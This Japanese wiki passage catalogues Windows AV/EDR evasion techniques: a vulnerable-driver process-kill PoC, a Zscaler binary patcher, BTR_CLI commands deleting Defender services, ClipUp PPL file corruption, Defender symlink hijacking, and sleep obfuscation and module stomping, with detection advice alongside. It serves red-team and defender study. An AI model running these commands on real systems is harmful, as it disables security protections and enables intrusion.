Storm-2603 は、ランサムウェアを配置する前にエンドポイント保護を無効化するため、**Antivirus Terminator** と呼ばれる小型のコンソールユーティリティを利用しました。このツールは**独自の脆弱ながらも *署名済み* のドライバー**を持ち込み、それを悪用して、Protected-Process-Light (PPL) の AV サービスでさえ阻止できない特権付きのカーネル操作を実行します。<sup>[[12]](#references)</sup>

主なポイント
1. **署名済みドライバー**: ディスクに書き込まれるファイルは `ServiceMouse.sys` ですが、実体は Antiy Labs の「System In-Depth Analysis Toolkit」に含まれる、正規に署名されたドライバー `AToolsKrnl64.sys` です。このドライバーには有効な Microsoft 署名が付いているため、Driver-Signature-Enforcement (DSE) が有効でも読み込まれます。
2. **サービスのインストール**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   1行目でドライバーを**kernel service**として登録し、2行目で起動することで、`\\.\ServiceMouse`がuser landからアクセス可能になります。
3. **ドライバーが公開するIOCTL**
   | IOCTL code | Capability                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PIDを指定して任意のプロセスを終了する（Defender/EDRサービスの停止に使用） |
   | `0x990000D0` | ディスク上の任意のファイルを削除する |
   | `0x990001D0` | ドライバーをアンロードし、サービスを削除する |

   最小限のC proof-of-concept：
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **有効な理由**:  BYOVD はユーザーモードの保護を完全に迂回します。カーネルで実行されるコードは、PPL/PP、ELAM、その他のハードニング機能にかかわらず、*保護された*プロセスを開いたり、終了させたり、カーネルオブジェクトを改変したりできます。

検知 / 緩和策
•  Microsoft の脆弱なドライバーのブロックリスト（`HVCI`、`Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` を読み込まないようにします。
•  新しい *カーネル* サービスの作成を監視し、ドライバーが全ユーザー書き込み可能なディレクトリから読み込まれた場合や、許可リストに存在しない場合にアラートを出します。
•  ユーザーモードのハンドルがカスタムデバイスオブジェクトにアクセスした後に、不審な `DeviceIoControl` 呼び出しが行われていないか監視します。

### ディスク上のバイナリパッチによる Zscaler Client Connector の Posture Checks の迂回

Zscaler の **Client Connector** は、デバイスの posture ルールをローカルで適用し、結果を他のコンポーネントに伝えるために Windows RPC を利用します。設計上の弱点が2つあるため、完全な迂回が可能です。

1. Posture の評価は**完全にクライアント側**で行われます（ブール値がサーバーに送信されます）。
2. 内部 RPC エンドポイントは、接続する実行ファイルが Zscaler によって署名されていることだけを（`WinVerifyTrust` を介して）検証します。<sup>[[11]](#references)</sup>

**ディスク上の署名済みバイナリ4つにパッチを適用する**ことで、両方の仕組みを無効化できます。

| バイナリ | パッチを適用する元のロジック | 結果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返すため、すべてのチェックが準拠扱いになります |
| `ZSAService.exe` | `WinVerifyTrust` への間接呼び出し | NOP-ed ⇒ 署名のないプロセスを含め、あらゆるプロセスが RPC パイプに接続できます |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置き換えられます |
| `ZSATunnel.exe` | トンネルの整合性チェック | 短絡されます |

最小限の patcher の抜粋:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

元のファイルを置き換えてサービススタックを再起動すると:

* **すべての** posture check が **green/compliant** と表示されます。
* 署名されていない、または改変されたバイナリが、名前付きパイプの RPC エンドポイント（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開けます。
* 侵害されたホストは、Zscaler ポリシーで定義された内部ネットワークへ無制限にアクセスできるようになります。

このケーススタディは、クライアント側だけで行われる信頼判断と単純な署名チェックが、わずかなバイトパッチで回避できることを示しています。

## Microsoft Defender `BTR.sys` trusted-functionality abuse

Defender の **Boot-Time Removal** driver は、従来の BYOVD に対する有用な反例です。`BTR.sys` は、メモリ破損のバグも IOCTL インターフェースもない、Microsoft 署名済みの正規の修復コンポーネントです。管理者アクセスと `SeLoadDriverPrivilege` を取得した後、オペレーターは代わりに、プライベートな修復トランザクションを偽造し、本来意図された Ring-0 のファイル／レジストリ操作を実行できます。これは**侵害後の AV/EDR 無効化プリミティブであり、初期アクセスや権限昇格ではありません**。また、目立つサードパーティ製 driver を持ち込むのではなく、ターゲット自身の `MpEngine.dll` にある `BOOTTIMETOOL` リソースから driver を抽出できます。<sup>[[36]](#references)</sup>

### ワンショット driver のステージング

Defender は通常、このリソースをランダムな `[a-z]{8}.sys` ファイルとして配置し、同じような名前の kernel service を登録します。`DriverEntry` は service の `Args` 値を読み取り、参照先の NTFS ADS を開き、アクションリストを復号して検証し、フィードバックを書き込みます。実行が成功すると `0xC0000056`（`STATUS_DELETE_PENDING`）を返すため、driver は常駐せずにアンロードされます。偽造した service には、次のような特徴的な値があります。<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist`ストリームには、RC4で暗号化されたblobが1つ含まれています。解析対象のビルドでは固定の256バイトキーが再利用されているため、暗号化は認可境界にはなりません。有効な平文は、24バイトのグローバルヘッダー（`Magic=0xFEE1DEAD`、`Version=2`、`PayloadOffset=0x10`、ヘッダーCRC、ペイロード由来のトランザクションID）に続いて、ヌル終端UTF-16フィードバックパスと任意の数のアイテムで構成されます。各アイテムは16バイトのヘッダー（`DataSize`、`Action`、`HeaderCRC`、`DataCRC`）と、アクション固有のデータで構成され、末尾は**正確に4バイトのNUL**で終わります。各ヘッダー領域とデータ領域は、CRC-32多項式`0xEDB88320`、初期状態`0xFFFFFFFF`、**最終XORなし**（`~CRC32`）で個別に検証されます。CRC状態は領域ごとにリセットされます。<sup>[[36]](#references)[[37]](#references)</sup>

受け入れられるアクションIDは、以下のカーネルプリミティブを提供します。<sup>[[36]](#references)[[37]](#references)</sup>

| ID | アイテムデータ | 結果 |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | ロックされたファイルを含め、ファイルを削除 |
| 2 | `[UTF-16 path]` | 空のディレクトリを削除 |
| 3 | `[Flags][source][destination]` | 攻撃者が選択した保護パスにファイルを移動。空の宛先は削除を意味する |
| 4 | `[Flags][key path]` | レジストリキーを再帰的に削除 |
| 5 | `[Flags][key path + "\\" + value]` | レジストリ値を削除 |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | レジストリ値を作成・更新し、不足しているキーのパスも作成 |

アクション5と6では、オンワイヤー形式のキーと値の区切り文字は**連続する2つのバックスラッシュ**です。通常の形式で記述されたパスは正しく分割されません。フィードバックファイルはおおむねリクエストを反映しますが、各アイテムのデータの先頭4バイトは、処理結果の`NTSTATUS`になります。先頭にflagsフィールドがないアクション1と2では、BTRはステータス用の領域を確保するため、パスを予約済みの末尾4バイトに移動します。<sup>[[36]](#references)</sup>

### `BTR_CLI`のワークフローと起動初期の実行機会

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI)は、一連の処理全体を実装しています。ローカルのDefenderから`BTR.sys`を抽出し、`<random>.sys:changelist`とフィードバックストリームを作成して、連鎖したアクションをシリアライズ、チェックサム計算、暗号化します。その後、サービスレジストリキーを直接作成し、`-trigger now`の場合は`NtLoadDriver`を呼び出します。`-trigger boot`の場合は、system-startドライバーとして残します。レジストリへの直接ステージングでは、通常のSCM `CreateServiceW`経路を経由しないため、サービスインストールのイベントID 7045は**発生しません**。起動時トリガーで作成された成果物は、後から`BTR_CLI.exe -cleanup <service_name>`で削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0`は使用できません。BTRは、ストレージスタックと`SystemRoot`リンクの準備が整う前に`DriverEntry`からファイルI/Oを実行するためです。`Start=1`と優先度の高い`Boot Bus Extender`グループを組み合わせると、Phase 1で実行されます。この時点ではNTFSは使用可能ですが、多くのシステム起動セキュリティドライバーやユーザーモードのEDRサービスは初期化されていません。`WdFilter`などのブート開始フィルターはすでに読み込まれている可能性がありますが、BTRは次回起動までにそのバイナリやサービス構成を削除でき、SCMが起動する前にサービス実行ファイルを削除することもできます。BTRはブート開始時の評価後に実行され、有効なMicrosoft署名を持つため、ELAMでもこの隙間は埋まりません。<sup>[[36]](#references)</sup>

複数のアクションが1つのトランザクション内で実行されます。PoCでは、ハードコードされた`\SystemRoot\Temp\BootClean.log`に対するAction 1を先頭に追加します。BTRはこのログを作成した後、自身の削除要求を処理し、アンロード前にログを削除します。これにより証拠を減らせます。また、フィードバックを`<random>.sys:<random>.dat`に保存すれば、ドライバーと両方のストリームをまとめて削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

### 高いシグナルを持つ検出相関

署名のみを使ったルールやMicrosoftの脆弱なドライバーのブロックリストでは、BTRの本来の機能の悪用には対処できません。正規のDefenderの系統と任意のランチャーを区別しつつ、次の動作相関を優先してください。<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist`の作成は、BTRのステージングで必ず発生します。同じ`.sys`に付加された`.dat` ADSは、特に疑わしいものです。正規のDefenderは通常、フィードバックを`C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`以下に保存するためです。
- **System 7045を伴わないSysmon 12/13:** `Args=...:changelist`および`Group=Boot Bus Extender`を含む`HKLM\SYSTEM\CurrentControlSet\Services\<random>`の直接作成を、対応するSCMインストールイベントがない場合に相関させます。
- **Sysmon 6 -> 23:** Defender以外の系統から既知のBTRドライバーが読み込まれ、その後、特にセキュリティ関連バイナリが`System`/PID 4によって削除された場合に相関させます。
- **Sysmon 11 -> 23:** `System`/PID 4による`\SystemRoot\Temp\BootClean.log`の短時間での作成と削除をアラートします。
- `SeLoadDriverPrivilege`の割り当てと有効化を制限・監査してください。`cmd.exe`、PowerShell、または不明なプロセスがセキュリティツールのドライバーをステージングする場合、Microsoft署名だけでは信頼できません。

## LOLBINsでProtected Process Light (PPL)を悪用してAV/EDRを改ざんする

Protected Process Light (PPL)は署名者/レベルの階層を適用し、同等以上の保護レベルを持つプロセスだけが互いに改ざんできるようにします。攻撃側から見ると、PPL対応バイナリを正規の方法で起動し、その引数を制御できれば、ロギングなどの無害な機能を、AV/EDRが使用する保護ディレクトリに対する、制約付きのPPLベースの書き込みプリミティブへと転用できます。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

プロセスをPPLとして実行する条件
- 対象のEXE（および読み込まれるDLL）は、PPL対応のEKUで署名されている必要があります。
- プロセスは、`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`フラグを指定してCreateProcessで作成する必要があります。
- バイナリの署名者に一致する互換性のある保護レベルを指定する必要があります（例：マルウェア対策署名者には`PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows署名者には`PROTECTION_LEVEL_WINDOWS`）。誤ったレベルを指定すると、作成に失敗します。

PP/PPLとLSASS保護の概要については、こちらも参照してください。

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

ランチャーツール
- オープンソースのヘルパー：CreateProcessAsPPL（保護レベルを選択し、引数を対象EXEに渡します）：
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- 使用パターン：

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN プリミティブ: ClipUp.exe
- 署名済みシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自身を起動し、呼び出し元が指定したパスにログファイルを書き込むパラメーターを受け取ります。
- PPL プロセスとして起動すると、PPL の権限でファイル書き込みが行われます。
- ClipUp はスペースを含むパスを解析できません。通常は保護されている場所を指定するには、8.3形式の短縮パスを使用してください。

8.3形式の短縮パスを確認する方法
- 短縮名を一覧表示する: 各親ディレクトリで `dir /x` を実行します。
- cmd で短縮パスを取得する: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

悪用チェーン（概要）
1) ランチャー（例: CreateProcessAsPPL）を使用し、`CREATE_PROTECTED_PROCESS` を指定して PPL 対応の LOLBIN（ClipUp）を起動します。
2) ClipUp のログパス引数を指定し、保護された AV ディレクトリ（例: Defender Platform）にファイルを作成させます。必要に応じて 8.3形式の短縮名を使用します。
3) 対象バイナリが実行中に AV によって通常開かれた状態、またはロックされた状態になる場合（例: MsMpEng.exe）、AV の起動前に書き込みが行われるよう、確実に早い段階で実行される自動起動サービスをインストールして、起動時に書き込みをスケジュールします。Process Monitor のブートログで起動順序を確認します。
4) 再起動すると、AV がバイナリをロックする前に PPL の権限で書き込みが行われ、対象ファイルが破損して起動できなくなります。

実行例（パスは安全のため伏せるか短縮しています）:

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

注意事項と制約
- ClipUp が書き込む内容は配置場所を除いて制御できません。このプリミティブは、正確な内容の注入よりも破損に適しています。
- サービスのインストール／起動と、再起動できる時間帯を確保するため、ローカル管理者／SYSTEM 権限が必要です。
- タイミングが重要です。対象が開かれていてはいけません。起動時に実行すれば、ファイルロックを回避できます。

検知
- 起動時に、特に標準的でないランチャーを親プロセスとして、ClipUp.exe が不審な引数で作成されていないか確認します。
- 不審なバイナリを自動起動するよう設定された新しいサービスや、Defender/AV より常に先に起動するサービスを確認します。Defender の起動失敗の前に行われたサービスの作成／変更を調査します。
- Defender のバイナリ／Platform ディレクトリに対するファイル整合性監視を行い、保護プロセスフラグを持つプロセスによる予期しないファイルの作成／変更を検知します。
- ETW/EDR のテレメトリで、`CREATE_PROTECTED_PROCESS` を指定して作成されたプロセスや、AV 以外のバイナリによる異常な PPL レベルの使用を探します。

緩和策
- WDAC/Code Integrity: PPL として実行できる署名済みバイナリと、その親プロセスを制限します。正当な状況以外での ClipUp の実行をブロックします。
- サービスの管理: 自動起動サービスの作成／変更を制限し、起動順序の操作を監視します。
- Defender の改ざん防止と早期起動保護が有効であることを確認します。バイナリの破損を示す起動エラーを調査します。
- 環境との互換性がある場合は、セキュリティツールを配置するボリュームで 8.3 短縮名の生成を無効にすることを検討してください（十分にテストしてください）。

## Platform バージョンフォルダーのシンボリックリンク乗っ取りによる Microsoft Defender の改ざん

Windows Defender は、次の場所にあるサブフォルダーを列挙して、実行する Platform を選択します。
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

最も辞書順で大きいバージョン文字列（例: `4.18.25070.5-0`）を持つサブフォルダーを選択し、そこから Defender サービスのプロセスを起動します（サービス／レジストリのパスもそれに合わせて更新されます）。この選択では、ディレクトリの再解析ポイント（シンボリックリンクを含む）も信頼されます。管理者はこれを利用して Defender を攻撃者が書き込み可能なパスにリダイレクトし、DLL sideloading やサービス妨害を実行できます。<sup>[[21]](#references)[[22]](#references)</sup>

前提条件
- ローカル管理者（Platform フォルダー配下にディレクトリ／シンボリックリンクを作成するために必要）
- 再起動、または Defender の Platform 再選択を発生させる手段（起動時のサービス再起動）
- 必要なのは標準搭載ツールのみ（mklink）

動作する理由
- Defender は自身のフォルダーへの書き込みをブロックしますが、Platform の選択ではディレクトリエントリを信頼し、リンク先が保護された／信頼されたパスに解決されるかを検証せずに、辞書順で最も大きいバージョンを選択します。

手順（例）
1) 現在の Platform フォルダーの書き込み可能なコピー（例: `C:\TMP\AV`）を用意します。
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform内に、自分のフォルダを指す上位バージョンのディレクトリシンボリックリンクを作成します。
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動を推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクトされたパスから実行されていることを確認します:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
新しいプロセスパスが `C:\TMP\AV\` 配下にあり、サービス構成とレジストリにもこの場所が反映されていることを確認してください。

Post-exploitation のオプション
- DLL sideloading/code execution: Defender がアプリケーションディレクトリから読み込む DLL を配置または置き換えて、Defender のプロセス内でコードを実行します。上記のセクションを参照してください: [DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial: バージョンシンボリックリンクを削除して、次回の起動時に設定済みのパスが解決されず、Defender が起動に失敗するようにします:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> この technique 自体は privilege escalation を提供しない点に注意してください。管理者権限が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

レッドチームは、対象モジュールの Import Address Table (IAT) を hook し、選択した API を攻撃者が制御する position-independent code (PIC) にルーティングすることで、runtime evasion を C2 implant から対象モジュール自体に移せます。これにより、多くの kit が公開する小規模な API 群（例: CreateProcessA）を超えて evasion を一般化し、同じ保護を BOFs や post-exploitation DLL にも適用できます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

高レベルの手法
- reflective loader を使い、対象モジュールと並行して PIC blob を配置します（先頭に追加するか、コンパニオンとして配置）。PIC は自己完結型で、position-independent である必要があります。
- ホスト DLL の読み込み時に、IMAGE_IMPORT_DESCRIPTOR を走査し、対象の import（例: CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）の IAT エントリを、薄い PIC wrapper を指すように patch します。
- 各 PIC wrapper は、実 API アドレスを tail-call する前に evasion を実行します。一般的な evasion には次のものがあります。
  - call の前後でのメモリの mask/unmask（例: beacon 領域の暗号化、RWX→RX、ページ名や権限の変更後に復元）。
  - Call-stack spoofing: 無害な stack を構築して対象 API に移行し、call-stack analysis で想定された frame が解決されるようにします。<sup>[[9]](#references)</sup>
- 互換性のため、Aggressor script（または同等のもの）が Beacon、BOFs、post-ex DLL 用に hook 対象の API を登録できる interface を export します。

ここで IAT hooking を使う理由
- hook した import を使うコードなら、tool のコードを変更したり、Beacon に特定の API の proxy を依存したりせずに動作します。
- post-ex DLL にも対応します。LoadLibrary* を hook すれば、モジュールの読み込み（例: System.Management.Automation.dll、clr.dll）を intercept し、その API call に同じ masking/stack evasion を適用できます。
- CreateProcessA/W を wrapper することで、call-stack ベースの検知に対して、プロセスを起動する post-ex command を安定して利用できます。

最小限の IAT hook の概略（x64 C/C++ pseudocode）
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
メモ
- relocations/ASLR の後、import が初めて使用される前に patch を適用します。TitanLdr/AceLdr などの Reflective loader は、ロードされたモジュールの DllMain 中に hooking を行う例です。
- wrapper は小さく、PIC-safe に保ちます。patch 前に取得した元の IAT 値、または LdrGetProcedureAddress を使って本来の API を解決します。
- PIC では RW → RX の遷移を使用し、書き込み可能かつ実行可能なページを残さないようにします。

Call-stack spoofing stub
- Draugr-style の PIC stub は、無害なモジュール内の return address を使って偽の call chain を構築し、その後、本来の API に移行します。
- これにより、Beacon/BOFs から機微な API への canonical stack を想定する検知を回避できます。
- stack cutting/stack stitching 技法と組み合わせ、API prologue の前に想定された frame 内へ移行します。

運用への統合
- reflective loader を post-ex DLL の先頭に追加すると、DLL のロード時に PIC と hook が自動的に初期化されます。
- Aggressor script を使って対象 API を登録すれば、コードを変更せずに Beacon と BOFs が同じ evasion path の恩恵を受けられます。

検知/DFIR の考慮事項
- IAT integrity: non-image（heap/anon）アドレスに解決される entry、import pointer の定期的な検証。
- Stack anomalies: ロード済み image に属さない return address、non-image PIC への急な遷移、一貫しない RtlUserThreadStart の祖先関係。
- Loader telemetry: プロセス内での IAT への書き込み、import thunk を変更する DllMain の早期処理、ロード時に作成される予期しない RX region。
- Image-load evasion: LoadLibrary* を hook する場合は、memory masking event と関連する automation/clr assembly の不審なロードを監視します。

関連する building block と例
- ロード中に IAT patching を行う reflective loader（例: TitanLdr、AceLdr）
- Memory masking hook（例: simplehook）と stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stub（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### 常駐 PICO による import-time IAT hook

reflective loader を制御できる場合は、`ProcessImports()` の**実行中に** loader の `GetProcAddress` pointer を、最初に hook を確認する custom resolver に置き換えて hook できます。<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- 一時的な loader PIC が自身を解放した後も存続する **resident PICO**（persistent PIC object）を構築します。
- loader の import resolver を上書きする `setup_hooks()` 関数を export します（例: `funcs.GetProcAddress = _GetProcAddress`）。
- `_GetProcAddress` では ordinal import をスキップし、`__resolve_hook(ror13hash(name))` のような hash-based hook lookup を使用します。hook があればそれを返し、なければ本物の `GetProcAddress` に処理を委譲します。
- Crystal Palace の `addhook "MODULE$Func" "hook"` entry を使い、link time に hook target を登録します。hook は resident PICO 内にあるため有効な状態を保ちます。

これにより、ロード後にロード済み DLL の code section を patch せずに、**import-time IAT redirection** を実現できます。

### 対象が PEB-walking を使う場合に hook 可能な import を強制する

import-time hook が起動するのは、その関数が対象の IAT に実際に存在する場合だけです。モジュールが PEB-walk + hash で API を解決し（import entry がない場合）、loader の `ProcessImports()` path に認識させるには、実際の import を強制します。

- hash による export 解決（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を、`&WaitForSingleObject` のような直接参照に置き換えます。
- compiler が IAT entry を出力するため、reflective loader が import を解決する際に interception できるようになります。

### `Sleep()` を patch しない Ekko-style sleep/idle obfuscation

`Sleep` を patch する代わりに、implant が実際に使用する **wait/IPC primitive**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）を hook します。長時間の wait では、idle 中にメモリ上の image を暗号化する Ekko-style obfuscation chain で呼び出しをラップします。<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer` を使い、作成した `CONTEXT` frame で `NtContinue` を呼び出す一連の callback をスケジュールします。
- 典型的な chain（x64）: image を `PAGE_READWRITE` に設定 → `advapi32!SystemFunction032` で memory 上の image 全体を RC4 暗号化 → blocking wait を実行 → RC4 で復号 → PE section を走査して **section ごとの permission を復元** → 完了を通知。
- `RtlCaptureContext` で template の `CONTEXT` を取得し、複数の frame に複製して、各ステップを呼び出すために register（`Rip/Rcx/Rdx/R8/R9`）を設定します。

運用上の詳細: 長時間の wait（例: `WAIT_OBJECT_0`）に対して「success」を返し、image が mask されている間に caller が処理を続けられるようにします。このパターンは idle window 中に scanner から module を隠し、典型的な「patched `Sleep()`」の signature を避けます。

検知のアイデア（telemetry ベース）
- `NtContinue` を指す `CreateTimerQueueTimer` callback の集中発生。
- 大きな連続した image サイズの buffer に対する `advapi32!SystemFunction032` の使用。
- 大きな範囲への `VirtualProtect` の後、section ごとの permission を独自に復元する処理。

### sleep-obfuscation gadget の runtime CFG 登録

CFG 対応の対象では、`jmp [rbx]` や `jmp rdi` のような function 中盤の gadget への最初の indirect jump は、通常、プロセスを `STATUS_STACK_BUFFER_OVERRUN` でクラッシュさせます。gadget が module の CFG metadata に登録されていないためです。強化されたプロセス内で Ekko/Kraken-style chain を機能させるには、次のようにします。<sup>[[30]](#references)</sup>

- chain が使う indirect destination をすべて、`NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` と `CFG_CALL_TARGET_VALID` entry で登録します。
- ロード済み image（`ntdll`、`kernel32`、`advapi32`）内の address では、`MEMORY_RANGE_ENTRY` は **image base** から開始し、**image 全体のサイズ**をカバーする必要があります。
- 手動 map された/PIC/stomp された region では、代わりに **allocation base** と allocation size を使います。
- dispatch gadget だけでなく、indirect に到達する export（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscall）や、indirect target となる attacker-controlled executable section も登録します。

これにより、ROP/JOP-style sleep chain を「CFG のないプロセスでしか機能しない」ものから、`explorer.exe`、browser、`svchost.exe`、および `/guard:cf` 付きでコンパイルされたその他の endpoint でも再利用可能な primitive にできます。

### sleep 中の thread に対する CET-safe stack spoofing

`CONTEXT` 全体を置き換える方法は目立ちやすく、CET Shadow Stack システムでは、spoof された `Rip` が hardware shadow stack と一致している必要があるため、問題を起こす可能性があります。より安全な sleep-masking パターンは次のとおりです。<sup>[[30]](#references)</sup>

- 同じプロセス内の別 thread を選び、`NtQueryInformationThread` 経由でその `NT_TIB` / TEB の stack bound（`StackBase`、`StackLimit`）を読み取ります。
- 現在の thread の実際の TEB/TIB をバックアップします。
- `GetThreadContext` で実際の sleeping context を取得します。
- 実際の `Rip` **だけ**を spoof context にコピーし、spoof された `Rsp`/stack state はそのままにします。
- sleep window 中は、spoof thread の `NT_TIB` を現在の TEB にコピーし、stack walker が正当な stack range 内で unwind するようにします。
- wait の終了後、元の TIB と thread context を復元します。

これにより、CET と整合する instruction pointer を維持しながら、unwind の検証に TEB stack metadata を使用する EDR stack walker を欺けます。

### APC ベースの代替手段: Kraken Mask

timer-queue dispatch の signature が強すぎる場合、suspend された helper thread から queued APC を使って、同じ sleep-encrypt-spoof-restore sequence を実行できます。<sup>[[27]](#references)</sup>

- `NtTestAlert` を entrypoint とする helper thread を作成します。
- `NtQueueApcThread` で準備した `CONTEXT` frame/APC を queue に入れ、`NtAlertResumeThread` で処理します。
- default の 64 KB thread stack を使い切らないよう、chain state は helper stack ではなく heap に保存します。
- `NtSignalAndWaitForSingleObject` を使い、start event の通知と block を atomic に行います。
- TIB/context を復元する前に main thread を suspend します（`NtSuspendThread` → restore → `NtResumeThread`）。これにより、scanner が復元途中の stack を検出する race window を短縮します。

この方法では、同じ RC4 masking と stack-spoofing の目的を維持しつつ、`CreateTimerQueueTimer` + `NtContinue` の signature を helper-thread/APC の signature に置き換えます。

追加の検知アイデア
- sleep、wait、または APC dispatch の直前に行われる、`VmCfgCallTargetInformation` を指定した `NtSetInformationVirtualMemory`。
- `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject`、または `ConnectNamedPipe` の前後で行われる `GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread` の後に、現在の thread の TEB/TIB stack bound へ直接書き込む処理。
- `SystemFunction032`、`VirtualProtect`、または section-permission restoration helper に間接的に到達する `NtQueueApcThread`/`NtAlertResumeThread` chain。
- 署名済み module 内の dispatch pivot として、短い gadget signature（`FF 23`（`jmp [rbx]`）や `FF E7`（`jmp rdi`））を繰り返し使用する処理。


## Precision Module Stomping

Module stomping は、目立つ private executable memory を割り当てたり、新たな sacrificial DLL をロードしたりする代わりに、対象プロセス内にすでに map されている DLL の **`.text` section** から payload を実行します。上書き先には、プロセスが引き続き必要とする code path を破損させずに payload を収められる **ロード済みの disk-backed image** を選ぶ必要があります。<sup>[[1]](#references)[[2]](#references)</sup>

### 信頼性の高い target の選定

`uxtheme.dll` や `comctl32.dll` など一般的な module を使った安易な stomping は不安定です。DLL が remote process にロードされていない可能性があり、code region が小さすぎるとプロセスがクラッシュするためです。より信頼性の高い workflow は次のとおりです。

1. 対象プロセスの module を列挙し、すでにロード済みの DLL の **名前のみの include list** を作成します。
2. 最初に payload をビルドし、**正確な byte size** を記録します。
3. ディスク上の候補 DLL を調べ、PE section の **`.text` `Misc_VirtualSize`** と payload size を比較します。これは file size より重要です。メモリに map された際の executable section のサイズを示すためです。
4. **Export Address Table (EAT)** を解析し、export された関数の RVA を stomp の開始 offset として選択します。
5. **blast radius** を計算します。payload が選択した関数の範囲を超えると、メモリ上で後続に配置されている隣接 export も上書きします。

実環境で見られる一般的な recon/選定 helper:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

運用上の注意
- `LoadLibrary` のテレメトリや予期しないイメージのロードを避けるため、リモートプロセスですでに **ロード済み** の DLL を優先する。
- 対象アプリケーションで実行される頻度が低い export を優先する。そうしないと、スレッド作成の前後に通常のコードパスが stomp されたバイト列に到達する可能性がある。
